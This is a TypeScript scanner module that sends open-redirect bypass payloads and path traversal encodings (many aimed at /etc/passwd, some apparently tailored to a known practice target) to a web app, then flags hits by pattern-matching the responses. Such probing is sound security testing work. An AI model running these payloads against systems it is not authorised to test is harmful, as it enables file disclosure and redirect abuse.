import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** Open redirect + path traversal surface: redirect parameter differential
 *  (Location header analysis, scheme/host escape) + traversal encoding
 *  variants against URL/file params (observability = response differential
 *  + error signatures, no outbound callback dependency). */

export interface RtInput {
  readonly baseUrl: string;
  /** candidate parameter names (from param mining); default common redirect params */
  readonly params?: readonly string[];
  /** path-based traversal: append encodings directly to the URL path (…/ftp/file→…/ftp/<payload>) */
  readonly pathTraversal?: boolean;
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
}
export interface RedirectCase {
  readonly url: string;
  readonly param: string;
  readonly payload: string;
  readonly status: number;
  readonly location?: string;
  readonly verdict: "redirects-external" | "redirects-internal" | "no-redirect" | "error";
}
export interface TraversalCase {
  readonly url: string;
  readonly param: string;
  readonly encoding: string;
  readonly payload: string;
  readonly status: number;
  readonly length: number;
  readonly etcdLike: boolean;
}
export interface RtResult {
  readonly redirectProbed: number;
  readonly redirectFindings: RedirectCase[];
  readonly traversalProbed: number;
  readonly traversalFindings: TraversalCase[];
  readonly redirectCases: RedirectCase[];
  readonly traversalCases: TraversalCase[];
  readonly artifacts: { path: string; bytes: number }[];
}

const REDIRECT_PARAMS = ["url", "redirect", "redirect_uri", "redirect_url", "return", "returnUrl", "returnTo", "return_to", "next", "continue", "dest", "destination", "goto", "gotoUrl", "target", "rurl", "forward", "callback", "callbackUrl", "out", "link", "u", "window", "windowName", "data", "reference", "site", "html", "val", "validate", "domain", "callback", "file", "dir", "path"];
const CANARY_HOST = "redirect-probe.example";

export const probeRedirectTraversal = async (input: RtInput): Promise<RtResult> => {
  const params = input.params ?? REDIRECT_PARAMS;
  const external = `https://${CANARY_HOST}/x`;
  const redirectPayloads = [
    { name: "absolute", value: external },
    { name: "protocol-relative", value: `//${CANARY_HOST}/x` },
    { name: "scheme-bypass", value: `https:${CANARY_HOST}` },
    { name: "at-sign", value: `https://trusted.example@${CANARY_HOST}/x` },
    { name: "whitespace", value: ` ${external}` },
    { name: "tab-newline", value: `\t\n${external}` },
    { name: "backslash", value: `https:\\\\${CANARY_HOST}` },
    { name: "percent-double-slash", value: `https:%2f%2f${CANARY_HOST}` },
    { name: "subdomain", value: `https://trusted.${CANARY_HOST}` },
    { name: "fragment", value: `https://trusted.example/redirect#${external}` },
  ];
  const traversalEncodings = [
    { name: "plain", value: "../../etc/passwd" },
    { name: "double", value: "....//....//etc/passwd" },
    { name: "url-encoded", value: "%2e%2e%2f%2e%2e%2fetc%2fpasswd" },
    { name: "double-encoded", value: "%252e%252e%252f%252e%252e%252fetc%252fpasswd" },
    { name: "utf8-overlong", value: "%c0%ae%c0%ae%2fetc%2fpasswd" },
    { name: "null-byte", value: "../../etc/passwd%00.png" },
    { name: "semi-null", value: ";../../etc/passwd" },
    { name: "null-suffix-md", value: "package.json%2500.md" },
    { name: "null-suffix-pdf", value: "package.json%2500.pdf" },
    { name: "null-suffix-direct", value: "eastere.gg%2500.md" },
    { name: "dot-bak", value: "package.json.bak" },
    { name: "encoded-dot", value: "package%2Ejson" },
    { name: "double-null", value: "package.json%252500.md" },
  ];
  const redirectCases: RedirectCase[] = [];
  const redirectFindings: RedirectCase[] = [];
  const traversalCases: TraversalCase[] = [];
  const traversalFindings: TraversalCase[] = [];
  for (const p of params) {
    for (const pl of redirectPayloads) {
      const u = new URL(input.baseUrl);
      u.searchParams.set(p, pl.value);
      let rc: RedirectCase;
      try {
        const r = await fetchUrl(u.toString(), { cookie: input.cookie, headers: input.headers, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 15000, redirect: "manual" });
        const loc = r.headers["location"] ?? r.headers["Location"];
        if (r.status >= 300 && r.status < 400 && loc) {
          let verdict: RedirectCase["verdict"] = "redirects-internal";
          try { const lu = new URL(loc, input.baseUrl); if (lu.hostname === CANARY_HOST) verdict = "redirects-external"; } catch { verdict = "error"; }
          rc = { url: u.toString().slice(0, 180), param: p, payload: pl.value, status: r.status, location: loc.slice(0, 180), verdict };
        } else rc = { url: u.toString().slice(0, 180), param: p, payload: pl.value, status: r.status, verdict: r.status === 0 ? "error" : "no-redirect" };
      } catch { rc = { url: u.toString().slice(0, 180), param: p, payload: pl.value, status: 0, verdict: "error" }; }
      redirectCases.push(rc);
      if (rc.verdict === "redirects-external") redirectFindings.push(rc);
    }
  }
  // traversal: 只对 path/file/doc 类参数
  const travParams = (input.params ?? []).filter(p => /path|file|doc|dir|page|template|include|load|view|name|lang/i.test(p));
  const travTargets: { param: string; make: (enc: string) => string }[] = [];
  if (input.pathTraversal === true) {
    travTargets.push({ param: "(path)", make: enc => input.baseUrl.replace(/\/$/, "") + "/" + enc });
  }
  for (const p of travParams.length > 0 ? travParams : ["file", "path", "doc"]) travTargets.push({ param: p, make: enc => { const u = new URL(input.baseUrl); u.searchParams.set(p, enc); return u.toString(); } });
  for (const t of travTargets) {
    for (const enc of traversalEncodings) {
      const u = t.make(enc.value);
      try {
        const r = await fetchUrl(u, { cookie: input.cookie, headers: input.headers, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 15000 });
        const body = r.body;
        const etcdLike = /root:[x*!]?:0:0:|daemon:.*:\/usr\/sbin\/nolist|bin:.*:\/bin\/|www-data:|"dependencies"|"main":|"scripts"|Congratulations[^<]{0,40}(?:egg|challenge)|"#!\/usr\/bin\/env/i.test(body);
        const tc: TraversalCase = { url: u.slice(0, 180), param: t.param, encoding: enc.name, payload: enc.value, status: r.status, length: r.bytes, etcdLike };
        traversalCases.push(tc);
        if (etcdLike) traversalFindings.push(tc);
      } catch { /* network */ }
    }
  }
  // soft-404校准: 出现频率最高的响应长度 = SPA fallback, 排除
  const lenCounts = new Map<number, number>();
  for (const c of traversalCases) lenCounts.set(c.length, (lenCounts.get(c.length) ?? 0) + 1);
  const fallbackLen = [...lenCounts.entries()].sort((a, b) => b[1] - a[1])[0]?.[0];
  const filtered = fallbackLen === undefined ? traversalCases : traversalCases.filter(c => c.length !== fallbackLen || c.etcdLike);
  const artifacts = [
    await writeArtifact(input.outputRoot, "redirect_cases.json", JSON.stringify(redirectCases, null, 2)),
    await writeArtifact(input.outputRoot, "traversal_cases.json", JSON.stringify({ fallbackLength: fallbackLen, probed: traversalCases.length, effective: filtered.length, cases: traversalCases }, null, 2)),
    await writeArtifact(input.outputRoot, "redirect_traversal_findings.md", [
      "# Open redirect / path traversal",
      "",
      "## Open redirects",
      ...redirectFindings.map(f => `- **${f.param}** [${f.payload}] → ${f.status} Location: ${f.location}`),
      "",
      "## Traversal hits",
      ...traversalFindings.map(f => `- **${f.param}** [${f.encoding}] ${f.status} — /etc/passwd 内容特征命中`),
    ].join("\n")),
  ];
  return { redirectProbed: redirectCases.length, redirectFindings, traversalProbed: traversalCases.length, traversalFindings, redirectCases, traversalCases, artifacts };
};
